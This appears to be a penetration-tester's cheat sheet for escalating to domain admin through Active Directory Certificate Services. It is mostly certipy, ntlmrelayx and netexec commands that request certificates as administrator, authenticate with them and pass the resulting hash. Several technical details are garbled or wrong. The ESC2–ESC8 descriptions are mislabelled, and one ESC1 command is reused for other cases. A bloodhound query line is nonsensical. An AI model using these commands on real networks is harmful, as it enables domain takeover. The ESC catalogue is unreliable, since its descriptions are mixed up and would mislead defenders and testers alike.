# AD CS Abuse (ESC1 - ESC8)

Active Directory Certificate Services is the most under-privileged-to-domain-admin path in most
environments, because the CA is often misconfigured in ways nobody monitors.

## Find the CA

```bash
certipy ldap -u user -p pass -d target.local -dc-ip 10.10.10.5
netexec target.local -u user -p pass --enum-smb-share
bloodhound-python> match (m:User) (c:certipyCA)
```

Also check the web enrollment endpoints directly:

```
http://ca.target.local/certsrv/          (IIS)
https://ca.target.local:443/certsrv/     (Windows Server 2012+)
http://ca.target.local/CertSrv/msdcl/    (DCOM)
```

## The ESC catalogue

### ESC1 — enrol a cert with any SAN

Requires: the enrollee can enrol in the template, and the template allows **supply the subject**
and does not require manager approval.

```bash
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' \
  -template 'User' -upn administrator@target.local -dc-ip 10.10.10.5
```

Result: a certificate for `administrator@target.local` → authenticate with it.

### ESC2 — any low-priv user can issue for a target

Same as ESC1 but the enrollee does not specify the subject — the CA issues for a chosen identity.

### ESC3 — certificate mapping over RPC

Needs enrollment + a way to get the DC to authenticate the certificate (RPC over HTTP).
`certipy shadow` sets up the RPC listener.

### ESC4 — enrol for a User Principal without knowing the password

Any user can request a certificate for any UPN if the template allows it, even without knowing that
account's password. Then use `certipy auth` to authenticate as that UPN.

### ESC5 — enrollment agent / low-priv enrollment on the CA

If a low-priv user can enroll on the CA itself, they can mint a CA-signed certificate for anyone.

### ESC6 — EDIT_CERTIFICATE on the CA

`EDIT_CERTIFICATE` on the CA object → change the CA's templates to include `Client Authentication`
and `EDIT_CERTIFICATE` for the CA cert itself → issue a CA certificate for any user.

```bash
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' -template 'User' \
  -upn administrator@target.local -dc-ip 10.10.10.5
certipy shadow ...   # for ESC3
```

### ESC7 — new certificate template with EDIT_CERTIFICATE

If you can create a template, you create one that lets you enrol for anything and edit the issued
cert.

### ESC8 — any X.509 enrollment policy with EKUs + enrollee-supplied UPN + SUBJECT_ALT_NAME

The 2022 wave. If a template has:
- `Client Authentication` EKU,
- `Enrollee Supplies Subject` enabled,
- `SUBJECT_ALTERNATIVE_NAME` in the request,

then you enrol a certificate for any UPN without any permission on that user.

```bash
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' \
  -template 'User' -upn administrator@target.local -dc-ip 10.10.10.5
```

**Test every template**, not just `User`:

```bash
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' -template 'UserAuth' \
  -upn administrator@target.local -dc-ip 10.10.10.5
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' -template 'WebServer' ...
```

## Post-enrolment: use the certificate

```bash
certipy auth -u administrator@target.local -pfx administrator.pfx -dc-ip 10.10.10.5
# then
netexec target.local -u administrator@target.local -H <hash> --dc-ip 10.10.10.5
```

## NTLM relay to AD CS (the other CA path)

If LDAP signing and channel binding are off, you can relay NTLM to the CA's HTTP enrollment and get
a certificate for whatever account you relayed as.

```bash
ntlmrelayx -t http://ca.target.local/certsrv/ -I 10.10.10.5 -l /tmp/relay
certipy req -u user -p pass -target ca.target.local -ca 'CA\CA-Name' -template 'User' \
  -upn administrator@target.local -dc-ip 10.10.10.5
```

## Other certificate abuse

| Technique | Path |
|---|---|
| Azure AD CS (AADCS) | same ESC set, plus managed identity abuse |
| ESC for machine accounts | `msDS-AllowedToDelegateTo` on the cert |
| Certificate with `UPN` of a Tier-0 SPN | delegate to a Tier-0 host |
| Unenrolled cert + "Full Control" on a cert in AD | enroll as anyone |
| Marked-as-trusted root CA in the enterprise | intercept all TLS |
| SID not present in the cert | `mS-SID-Extension` absent → SID filtering bypass (Potato) |

## Reporting

```
CA:          <CA name, template, enrolment URL>
TRIGGER:     <ESC number + the exact template property that allows it>
PROOF:       <certipy command + the certificate issued>
AUTH:        <certipy auth / netexec as the resulting identity>
BLAST:       <privileges obtained>
```
